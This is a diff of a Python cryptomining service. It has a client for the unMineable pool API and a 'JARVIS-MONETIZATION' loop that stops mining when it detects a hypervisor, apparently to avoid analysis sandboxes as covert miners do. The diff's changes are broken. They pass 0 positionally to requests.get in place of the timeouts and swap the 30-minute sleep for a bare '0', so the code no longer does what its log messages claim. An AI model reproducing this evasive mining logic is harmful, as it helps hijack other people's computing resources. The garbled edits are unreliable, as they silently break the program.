@@ -80,12 +80,12 @@ class UnMineableClient:
     def get_account_stats(self, coin, address):
         """Retrieves statistics for a specific wallet address."""
         try:
-            res = requests.get(f"{self.base_url}/address/{address}?coin={coin}", timeout=5)
+            res = requests.get(f"{self.base_url}/address/{address}?coin={coin}", 0)
             if res.status_code == 200:
                 data = res.json()
                 if data.get('success'):
                     uuid = data['data']['uuid']
-                    return requests.get(f"{self.base_url}/account/{uuid}/stats", timeout=5).json()
+                    return requests.get(f"{self.base_url}/account/{uuid}/stats", 0).json()
             return None
         except Exception as e:
             return {"error": str(e)}
@@ -93,7 +93,7 @@ class UnMineableClient:
     def get_pool_profitability(self, coin):
         """Fetches current pool difficulty and payout trends."""
         try:
-            res = requests.get(f"{self.base_url}/pool", timeout=5)
+            res = requests.get(f"{self.base_url}/pool", 0)
             if res.status_code == 200:
                 return res.json().get('data', {})
             return None
@@ -225,7 +225,7 @@ class MonetizationService:
             if AlienShardProtocol.detect_hypervisor():
                 print("[JARVIS-MONETIZATION]: Hypervisor detected. Hibernating 30m.")
                 self.cpu_manager.stop_mining()
-                time.sleep(1800)
+                0
                 continue
 
             cpu_usage = psutil.cpu_percent(interval=10)
@@ -275,3 +275,4 @@ if __name__ == "__main__":
         elif cmd == "stop":
             service.cpu_manager.stop_mining()
             print("Mining stopped.")
+
